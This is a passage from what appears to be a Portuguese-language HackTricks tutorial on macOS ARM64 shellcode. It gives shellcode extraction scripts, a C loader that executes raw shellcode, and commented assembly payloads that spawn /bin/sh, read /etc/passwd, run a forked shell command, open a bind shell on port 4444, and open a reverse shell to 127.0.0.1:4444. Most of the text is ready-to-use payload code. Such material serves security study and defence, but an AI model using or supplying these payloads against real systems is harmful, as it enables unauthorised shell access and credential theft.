ld -o shell shell.o -macosx_version_min 13.0 -lSystem -L /Library/Developer/CommandLineTools/SDKs/MacOSX.sdk/usr/lib

# You could also use this
ld -o shell shell.o -syslibroot $(xcrun -sdk macosx --show-sdk-path) -lSystem
```
Para extrair os bytes:
```bash
# Code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/b729f716aaf24cbc8109e0d94681ccb84c0b0c9e/helper/extract.sh
for c in $(objdump -d "s.o" | grep -E '[0-9a-f]+:' | cut -f 1 | cut -d : -f 2) ; do
echo -n '\\x'$c
done
```
Para versões mais recentes do macOS:
```bash
# Code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/fc0742e9ebaf67c6a50f4c38d59459596e0a6c5d/helper/extract.sh
for s in $(objdump -d "s.o" | grep -E '[0-9a-f]+:' | cut -f 1 | cut -d : -f 2) ; do
echo -n $s | awk '{for (i = 7; i > 0; i -= 2) {printf "\\x" substr($0, i, 2)}}'
done
```
<details>

<summary>Código C para testar o shellcode</summary>
```c
// code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/helper/loader.c
// gcc loader.c -o loader
#include <stdio.h>
#include <sys/mman.h>
#include <string.h>
#include <stdlib.h>

int (*sc)();

char shellcode[] = "<INSERT SHELLCODE HERE>";

int main(int argc, char **argv) {
printf("[>] Shellcode Length: %zd Bytes\n", strlen(shellcode));

void *ptr = mmap(0, 0x1000, PROT_WRITE | PROT_READ, MAP_ANON | MAP_PRIVATE | MAP_JIT, -1, 0);

if (ptr == MAP_FAILED) {
perror("mmap");
exit(-1);
}
printf("[+] SUCCESS: mmap\n");
printf("    |-> Return = %p\n", ptr);

void *dst = memcpy(ptr, shellcode, sizeof(shellcode));
printf("[+] SUCCESS: memcpy\n");
printf("    |-> Return = %p\n", dst);

int status = mprotect(ptr, 0x1000, PROT_EXEC | PROT_READ);

if (status == -1) {
perror("mprotect");
exit(-1);
}
printf("[+] SUCCESS: mprotect\n");
printf("    |-> Return = %d\n", status);

printf("[>] Trying to execute shellcode...\n");

sc = ptr;
sc();

return 0;
}
```
</details>

#### Shell

Retirado de [**here**](https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/shell.s) e explicado.

{{#tabs}}
{{#tab name="with adr"}}
```armasm
.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).

_main:
adr  x0, sh_path  ; This is the address of "/bin/sh".
mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.
mov  x16, #59     ; Move the execve syscall number (59) into x16.
svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.

sh_path: .asciz "/bin/sh"
```
{{#endtab}}

{{#tab name="with stack"}}
```armasm
.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).

_main:
; We are going to build the string "/bin/sh" and place it on the stack.

mov  x1, #0x622F  ; Move the lower half of "/bi" into x1. 0x62 = 'b', 0x2F = '/'.
movk x1, #0x6E69, lsl #16 ; Move the next half of "/bin" into x1, shifted left by 16. 0x6E = 'n', 0x69 = 'i'.
movk x1, #0x732F, lsl #32 ; Move the first half of "/sh" into x1, shifted left by 32. 0x73 = 's', 0x2F = '/'.
movk x1, #0x68, lsl #48   ; Move the last part of "/sh" into x1, shifted left by 48. 0x68 = 'h'.

str  x1, [sp, #-8] ; Store the value of x1 (the "/bin/sh" string) at the location `sp - 8`.

; Prepare arguments for the execve syscall.

mov  x1, #8       ; Set x1 to 8.
sub  x0, sp, x1   ; Subtract x1 (8) from the stack pointer (sp) and store the result in x0. This is the address of "/bin/sh" string on the stack.
mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.

; Make the syscall.

mov  x16, #59     ; Move the execve syscall number (59) into x16.
svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.

```
{{#endtab}}

{{#tab name="with adr for linux"}}
```armasm
; From https://8ksec.io/arm64-reversing-and-exploitation-part-5-writing-shellcode-8ksec-blogs/
.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).

_main:
adr  x0, sh_path  ; This is the address of "/bin/sh".
mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.
mov  x16, #59     ; Move the execve syscall number (59) into x16.
svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.

sh_path: .asciz "/bin/sh"
```
{{#endtab}}
{{#endtabs}}

#### Ler com cat

O objetivo é executar `execve("/bin/cat", ["/bin/cat", "/etc/passwd"], NULL)`, então o segundo argumento (x1) é um array de parâmetros (o que na memória significa uma pilha de endereços).
```armasm
.section __TEXT,__text     ; Begin a new section of type __TEXT and name __text
.global _main              ; Declare a global symbol _main
.align 2                   ; Align the beginning of the following code to a 4-byte boundary

_main:
; Prepare the arguments for the execve syscall
sub sp, sp, #48        ; Allocate space on the stack
mov x1, sp             ; x1 will hold the address of the argument array
adr x0, cat_path
str x0, [x1]           ; Store the address of "/bin/cat" as the first argument
adr x0, passwd_path    ; Get the address of "/etc/passwd"
str x0, [x1, #8]       ; Store the address of "/etc/passwd" as the second argument
str xzr, [x1, #16]     ; Store NULL as the third argument (end of arguments)

adr x0, cat_path
mov x2, xzr            ; Clear x2 to hold NULL (no environment variables)
mov x16, #59           ; Load the syscall number for execve (59) into x8
svc 0                  ; Make the syscall


cat_path: .asciz "/bin/cat"
.align 2
passwd_path: .asciz "/etc/passwd"
```
#### Invocar comando com sh a partir de um fork para que o processo principal não seja finalizado
```armasm
.section __TEXT,__text     ; Begin a new section of type __TEXT and name __text
.global _main              ; Declare a global symbol _main
.align 2                   ; Align the beginning of the following code to a 4-byte boundary

_main:
; Prepare the arguments for the fork syscall
mov x16, #2            ; Load the syscall number for fork (2) into x8
svc 0                  ; Make the syscall
cmp x1, #0             ; In macOS, if x1 == 0, it's parent process, https://opensource.apple.com/source/xnu/xnu-7195.81.3/libsyscall/custom/__fork.s.auto.html
beq _loop              ; If not child process, loop

; Prepare the arguments for the execve syscall

sub sp, sp, #64        ; Allocate space on the stack
mov x1, sp             ; x1 will hold the address of the argument array
adr x0, sh_path
str x0, [x1]           ; Store the address of "/bin/sh" as the first argument
adr x0, sh_c_option    ; Get the address of "-c"
str x0, [x1, #8]       ; Store the address of "-c" as the second argument
adr x0, touch_command  ; Get the address of "touch /tmp/lalala"
str x0, [x1, #16]      ; Store the address of "touch /tmp/lalala" as the third argument
str xzr, [x1, #24]     ; Store NULL as the fourth argument (end of arguments)

adr x0, sh_path
mov x2, xzr            ; Clear x2 to hold NULL (no environment variables)
mov x16, #59           ; Load the syscall number for execve (59) into x8
svc 0                  ; Make the syscall


_exit:
mov x16, #1            ; Load the syscall number for exit (1) into x8
mov x0, #0             ; Set exit status code to 0
svc 0                  ; Make the syscall

_loop: b _loop

sh_path: .asciz "/bin/sh"
.align 2
sh_c_option: .asciz "-c"
.align 2
touch_command: .asciz "touch /tmp/lalala"
```
#### Bind shell

Bind shell a partir de [https://raw.githubusercontent.com/daem0nc0re/macOS_ARM64_Shellcode/master/bindshell.s](https://raw.githubusercontent.com/daem0nc0re/macOS_ARM64_Shellcode/master/bindshell.s) na **porta 4444**
```armasm
.section __TEXT,__text
.global _main
.align 2
_main:
call_socket:
// s = socket(AF_INET = 2, SOCK_STREAM = 1, 0)
mov  x16, #97
lsr  x1, x16, #6
lsl  x0, x1, #1
mov  x2, xzr
svc  #0x1337

// save s
mvn  x3, x0

call_bind:
/*
* bind(s, &sockaddr, 0x10)
*
* struct sockaddr_in {
*     __uint8_t       sin_len;     // sizeof(struct sockaddr_in) = 0x10
*     sa_family_t     sin_family;  // AF_INET = 2
*     in_port_t       sin_port;    // 4444 = 0x115C
*     struct  in_addr sin_addr;    // 0.0.0.0 (4 bytes)
*     char            sin_zero[8]; // Don't care
* };
*/
mov  x1, #0x0210
movk x1, #0x5C11, lsl #16
str  x1, [sp, #-8]
mov  x2, #8
sub  x1, sp, x2
mov  x2, #16
mov  x16, #104
svc  #0x1337

call_listen:
// listen(s, 2)
mvn  x0, x3
lsr  x1, x2, #3
mov  x16, #106
svc  #0x1337

call_accept:
// c = accept(s, 0, 0)
mvn  x0, x3
mov  x1, xzr
mov  x2, xzr
mov  x16, #30
svc  #0x1337

mvn  x3, x0
lsr  x2, x16, #4
lsl  x2, x2, #2

call_dup:
// dup(c, 2) -> dup(c, 1) -> dup(c, 0)
mvn  x0, x3
lsr  x2, x2, #1
mov  x1, x2
mov  x16, #90
svc  #0x1337
mov  x10, xzr
cmp  x10, x2
bne  call_dup

call_execve:
// execve("/bin/sh", 0, 0)
mov  x1, #0x622F
movk x1, #0x6E69, lsl #16
movk x1, #0x732F, lsl #32
movk x1, #0x68, lsl #48
str  x1, [sp, #-8]
mov	 x1, #8
sub  x0, sp, x1
mov  x1, xzr
mov  x2, xzr
mov  x16, #59
svc  #0x1337
```
#### Reverse shell

A partir de [https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/reverseshell.s](https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/reverseshell.s), revshell para **127.0.0.1:4444**
```armasm
.section __TEXT,__text
.global _main
.align 2
_main:
call_socket:
// s = socket(AF_INET = 2, SOCK_STREAM = 1, 0)
mov  x16, #97
lsr  x1, x16, #6
lsl  x0, x1, #1
mov  x2, xzr
svc  #0x1337

// save s
mvn  x3, x0

call_connect:
/*
* connect(s, &sockaddr, 0x10)
*
* struct sockaddr_in {
*     __uint8_t       sin_len;     // sizeof(struct sockaddr_in) = 0x10
*     sa_family_t     sin_family;  // AF_INET = 2
*     in_port_t       sin_port;    // 4444 = 0x115C
*     struct  in_addr sin_addr;    // 127.0.0.1 (4 bytes)
*     char            sin_zero[8]; // Don't care
* };
*/
mov  x1, #0x0210
movk x1, #0x5C11, lsl #16
movk x1, #0x007F, lsl #32
movk x1, #0x0100, lsl #48
str  x1, [sp, #-8]
mov  x2, #8
sub  x1, sp, x2
mov  x2, #16
mov  x16, #98
svc  #0x1337

lsr  x2, x2, #2

call_dup:
// dup(s, 2) -> dup(s, 1) -> dup(s, 0)
mvn  x0, x3
lsr  x2, x2, #1
mov  x1, x2
mov  x16, #90
svc  #0x1337
mov  x10, xzr
cmp  x10, x2
bne  call_dup

call_execve:
// execve("/bin/sh", 0, 0)
mov  x1, #0x622F
movk x1, #0x6E69, lsl #16
movk x1, #0x732F, lsl #32
movk x1, #0x68, lsl #48
str  x1, [sp, #-8]
mov	 x1, #8
sub  x0, sp, x1
mov  x1, xzr
mov  x2, xzr
mov  x16, #59
svc  #0x1337
```
{{#include ../../../banners/hacktricks-training.md}}
